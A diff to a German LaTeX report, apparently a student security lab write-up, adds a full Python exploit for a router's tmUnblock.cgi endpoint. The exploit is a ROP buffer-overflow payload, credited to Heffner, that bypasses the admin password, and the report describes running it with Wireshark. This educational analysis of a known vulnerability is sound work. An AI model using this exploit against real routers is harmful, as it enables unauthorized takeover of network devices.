@@ -1146,9 +1146,77 @@
 	Code enthalten, der die besagte Schwachstelle ausnutzt. Hierzu gibt es zwei
 	Möglichkeiten, einmal ein Bashskript und ein Programm für die Software
 	Metasploit, welche standardmäßig bei Kali Linux installiert ist.
-	%wenns funktioniert, sollte der Code erklärt werden .. lsting
+	Mit dem folgenden Python Skript wurde der Exploit erfolgreich ausgeführt:
+	\begin{lstlisting}[language=Python]
+	#!/usr/bin/env python
+	#...
 
+	import sys
+	import urllib.request
+	import urllib.error
 
+	try:
+		target = sys.argv[1]
+	except IndexError:
+		print( "Usage: %s <target ip>" % sys.argv[0])
+		sys.exit(1)
+
+	url = target + '/cgi-bin/tmUnblock.cgi'
+	if '://' not in url:
+		url = 'http://' + url
+
+	post_data = "period=0&TM_Block_MAC=00:01:02:03:04:05&TM_Block_URL="
+	post_data += "B" * 246                  # Filler
+	post_data += "\x81\x54\x4A\xF0"         # $s0, address of admin password in memory
+	post_data += "\x80\x31\xF6\x34"         # $ra
+	post_data += "C" * 0x28                 # Stack filler
+	post_data += "D" * 4                    # ROP 1 $s0
+	post_data += "\x80\x34\x71\xB8"         # ROP 1 $ra
+	post_data += "E" * 8                    # Stack filler
+
+	for i in range(0, 4):
+		post_data += "F" * 4                # ROP 2 $s0
+		post_data += "G" * 4                # ROP 2 $s1
+		post_data += "\x80\x34\x71\xB8"     # ROP 2 $ra
+		post_data += "H" * (4-(3*(i//3)))    # Stack filler
+
+	try:
+		req = urllib.request.Request(url, post_data.encode("utf-8"))
+		res = urllib.request.urlopen(req)
+	except urllib.error.HTTPError as e:
+		if e.code == 500:
+			print("OK")
+		else:
+			print ("Received unexpected server response:", str(e))
+	except KeyboardInterrupt:
+		pass
+	\end{lstlisting}
+	%hier script erklären
+	In der folgenden Abbildung ist ein Ausschnitt des Netzwerkverkehrs der
+	VM zu sehen. Der durch das Skript erstellte HTTP-POST ist zu sehen.
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/exploit_bash_nwtraffic_httppost.png}
+		\caption{Netzwerkverkehr - HTTP-Post Exploit}
+		\label{fig:w_exploit}
+	\end{figure}
+	%beschreiben was man hier genau sieht in der Wireshark Aufzeichnung
+	Kommentare wurden zur besseren Darstellung teilweise entfernt, das 
+	Original File ist im Anhang verfügbar.
+	Da auf der genutzten Kali eine neuere Version von Python genutzt wird,
+	entspricht das obige Skript nicht vollkommen dem Original von Heffner 
+	\cite{heffner2014}.
+	Um das Skript auszuführen wurde der PC mit dem Router per WLAN verbunden,
+	Wireshark gestartet, Chromium geöffnet und dann das Pythonskript
+	ausgeführt. So lange das Skript läuft kann ohne Eingabe des Passworts
+	direkt die Seite des Routers geöffnet werden. 
+	\begin{lstlisting}[language=bash]
+	./remote-exploit
+	\end{lstlisting}
+	
+
+	%schauen ob ich die Hex Adressen vom Python Skirpt in der Datei von
+	%Binwalk finde. Z.B. \x81\x54\x4A\xF0
 	%( )was erkennt man in der CVE
 	%( )wie kann ich ihn auslösen (Bash Sctip, Metasploit)
 	%( )Metasploit erklären
